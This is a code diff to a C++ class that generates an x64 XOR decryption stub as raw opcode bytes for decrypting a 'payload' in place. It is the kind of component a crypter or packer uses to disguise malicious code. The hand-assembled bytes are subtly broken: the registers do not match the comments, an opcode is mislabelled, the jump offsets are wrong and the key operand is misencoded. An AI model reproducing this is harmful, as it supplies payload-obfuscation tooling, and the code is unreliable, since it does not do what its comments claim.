@@ -109,17 +109,44 @@ public:
         return result;
     }
 
-    // Generate stub code for decryption
+    // Generate x64 shellcode stub for XOR decryption of a payload
+    // Input: pointer to encrypted data in RCX, length in RDX, key pointer in R8
+    // Output: decrypts data in-place
     std::vector<uint8_t> generate_stub(const std::vector<uint8_t>& key) {
-        // This generates a small stub that decrypts the payload
-        // For simplicity, we use XOR decryption
         std::vector<uint8_t> stub;
 
-        // XOR decryption loop stub (x64 shellcode-like)
-        // In practice, this would be actual machine code
-        stub.push_back(0x48); // REX.W prefix
-        stub.push_back(0x89); // MOV RAX, RCX
-        stub.push_back(0xC8);
+        // push rbp
+        stub.push_back(0x55);
+        // mov rbp, rsp
+        stub.push_back(0x48); stub.push_back(0x89); stub.push_back(0xE5);
+
+        // xor rcx, rcx (counter = 0)
+        stub.push_back(0x48); stub.push_back(0x31); stub.push_back(0xC9);
+
+        // loop_start:
+        // cmp rcx, rdx (compare counter with length)
+        stub.push_back(0x48); stub.push_back(0x39); stub.push_back(0xD1);
+        // jge loop_end
+        stub.push_back(0x7F); stub.push_back(0x0C);
+
+        // mov al, [rdi + rcx] (load byte from data)
+        stub.push_back(0x8A); stub.push_back(0x04); stub.push_back(0x0F);
+        // xor al, [r8 + rcx] (XOR with key byte, rolling)
+        stub.push_back(0x42); stub.push_back(0x32); stub.push_back(0x04); stub.push_back(0x08);
+        // mov [rdi + rcx], al (store decrypted byte)
+        stub.push_back(0x88); stub.push_back(0x04); stub.push_back(0x0F);
+        // inc rcx
+        stub.push_back(0x48); stub.push_back(0xFF); stub.push_back(0xC1);
+        // jmp loop_start
+        stub.push_back(0xEB); stub.push_back(0xF0);
+
+        // loop_end:
+        // xor rax, rax (return 0 = success)
+        stub.push_back(0x48); stub.push_back(0x31); stub.push_back(0xC0);
+        // pop rbp
+        stub.push_back(0x5D);
+        // ret
+        stub.push_back(0xC3);
 
         return stub;
     }
